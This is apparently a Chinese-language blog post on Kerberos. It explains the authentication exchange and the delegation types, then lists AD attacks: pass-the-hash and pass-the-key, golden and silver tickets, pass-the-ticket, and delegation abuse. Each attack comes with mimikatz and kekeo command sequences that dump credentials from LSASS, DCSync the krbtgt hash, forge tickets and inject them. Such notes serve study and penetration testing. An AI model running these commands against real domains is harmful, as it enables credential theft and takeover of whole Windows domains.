---
layout: post
title: Kerberos协议
tags: Protocol,windows
---

# Kerberos协议

## kerberos 认证过程

### 角色

+ Client：访问服务的主机
+ Server：提供服务的主机
+ KDC（Key Distribution Center）：密钥分发中心，包含 AS（Authentication Service） 和 TGS（Ticket Granting Service）

### 过程

+ AS_REQ：Client 向 KDC 发送 ASREQ，请求凭据是 Client hash 加密的时间戳
+ AS_REP：KDC 使用 Client hash 进行解密，如果结果正确就返回 krbtgt hash 加密的 TGT 票据，TGT 票据里包含 PAC，PAC 包含 Client 的sid、Client 所在的组
+ TGS_REQ：Client 向 KDC 发送 TGT 票据，请求特定服务
+ TGS_RSP：KDC 使用 krbtgt hash 进行解密，如果结果正确，就返回用服务 hash 加密的 TGS 票据
+ AP_REQ：Client 使用 TGS 票据请求服务
+ AP_REP：服务用自己的 hash 解密 TGS 票据，如果解密正确，就发送 PAC 给 KDC，询问 Client 的访问权限，域控解密 PAC，获取 Client 的 sid，以及所在的组再根据服务的 ACL，判断 Client 的权限

## 委派

主机 A 使用主机 B 的某服务，此时需要通过主机 B 的某服务请求主机 C 的 某项专属 A 的服务，B 就需要代表 A 去访问 C 的该服务。

### 非约束性委派

被配置了约束性委派的主机B，会接受任何用户的委派去请求其他服务，原理是 A 将 TGT 发送到 B 中并缓存到 LSASS，B 就可以模拟用户去访问服务。

### 约束委派

约束委派将限制指定服务器可以代表用户执行的服务，原理是收到用户的请求之后，首先代表用户获得针对服务自身的可转发的kerberos服务票据(S4U2SELF)，拿着这个票据向KDC请求访问特定服务的可转发的TGS(S4U2PROXY)，并且代表用户访问特定服务，而且只能访问该特定服务（需要域管理员的权限）。

### 基于资源的约束委派

约束委派需要域管理员权限，为了使用户资源更加独立，微软引进了基于资源的约束委派。基于资源的约束委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员。



## 认证过程引发的安全问题

### PTH/PTK

PTH，即 pass the hash。在访问主机 RDP 服务时，进行认证的过程中，唯一用到的与 Client 密码相关的是 AS_REQ 中使用的 hash，因此没有明文密码也是可以认证的。如果 hash 的 ntlm hash，加密方式为 rc4，这种就属于 pth，如果 hash 是 aes key，就算是 pass the key。

#### mimikatz操作

##### PTH

```
在目标机器中抓取密码 hash：
privilege::debug
sekurlsa::logonpasswords

在本机 pass the hash：
sekurlsa::pth /user:administrator /domain:workgroup /ntlm:ccef208c6485269c20db2cad21734fe7
```
##### PTK
```
在目标机器中抓取 key：
privilege::debug
mimikatz "privilege::debug" "sekurlsa::ekeys"

在本机 pass the key：
mimikatz "privilege::debug" "sekurlsa::pth /user:mary /domain:hack.test /aes256:c4388a1fb9bd65a88343a32c09e53ba6c1ead4de8a17a442e819e98c522fc288" 
```



### 黄金票据

AS_REP 中的 TGT 票据是使用 krbtgt 的 hash 进行加密的，如果拥有 krbtgt 的hash，就可以给自己签发任意用户的 TGT 票据，这个票据被称为黄金票据。

#### mimikatz

```
在域控内导出 kribtgt 的 hash：
privilege::Debug
lsadump::dcsync /domain:hack.test /user:krbtgt

在域内机器中获取域 sid（域用户sid去除最后一项）：
whoami /all

生成黄金票据：
kerberos::golden /user:Administrator /domain:hack.test /sid:S-1-5-21-3763276348-88739081-2848684050 /krbtgt:d8d2ad72a119a8d418703f7a16580af6 /ticket:1.kirbi

在本机测试：
kerberos::purge // 清空已有票据
kerberos::ptt 1.kirbi	//导入票据
lsadump::dcsync /domain:test.com /user:krbtgt	// 导出 krbtgt 账号密码，作用是测试票据是否导入成功
```



### PTT

ptt，即 pass the ticket，Kerberos认证过程除了第一步AS_REQ是使用时间戳加密用户hash验证之外，其他验证都是通过票据，如果能拿到票据，就可以使用票据进行下个阶段的验证。

#### mimikatz

```
在域控中导出所有票据：
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"	

在本机导入票据：
kerberos::purge	//清除票据
mimikatz.exe "kerberos::ptt "[0;4ee98c]-2-0-60a00000-Administrator@krbtgt-GOD.ORG.kirbi"	//将票据注入到内存
```



### 白银票据

TGS_REP 中返回的 TGS 票据是使用服务的 hash 加密的，如果已经拥有服务的 hash，就可以给任意用户签发票据，访问特定服务，这就是白银票据。伪造的白银票据并没有与 KDC 通讯，所以票据里并没有带有有效 KDC 签名的 PAC，故如果目标主机配置为验证 KDC PAC签名，则白银票据失效。

#### mimikatz

```
域管账号登录域控，抓取密码hash：
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"

在域内机器中获取域 sid（域用户sid去除最后一项）：
whoami /all

导入白银票据：
kerberos::golden /domain:hack.test /sid:S-1-5-21-4188752632-3746001697-3968431413 /target:dc.hack.test /rc4:6f949c52336e143ff8a2f5957416a73a /service:cifs /user:ceshi /ptt

导入命令详解：
kerberos::golden：使用minikatz中票据的功能
/domain：指定域名
/sid：域sid号
/target：主域控中的计算机全名
/rc4：在域控中抓取的hash(NTLM)
/service：需要伪造的服务（cifs只是其中的一种服务，可伪造的服务很多）
/user：需要伪造的用户名（可自定义）
/ppt：伪造了以后直接写入到内存中
```



### 非约束委派攻击

拿下配置非约束委派的服务器后，诱导域管访问，此时域管会将自己的 TGT 票据发送给该服务器并缓存到 Lsass 中，导出票据即可使用 PTT 接管域账号



### 约束委派攻击

拿下约束委派用户的账号密码后，可以向域控发送 TGT 请求，得到特定服务可转发的 TGS 票据

#### kekeo+mimikatz

```
已获取约束委派用户账号密码的前提下：

使用 kekeo 向域控发起 TGT 请求:
tgt::ask /user:test /domain:hack.test /password:Asdf1234 /ticket:test.kirbi

利用得到的 TGT 票据去 TGS 申请 ST 票据：
tgs::s4u /tgt:TGT_test@HACK.TEST_krbtgt~hack.test@hack.test.kirbi /user:Administrator@hack.test /service:cifs/DC.hack.test

mimikatz导入票据：
kerberos::ptt TGS_Administrator@hack.test@HACK.TEST_cifs~DC.hack.test@HACK.TEST.kirbi
```







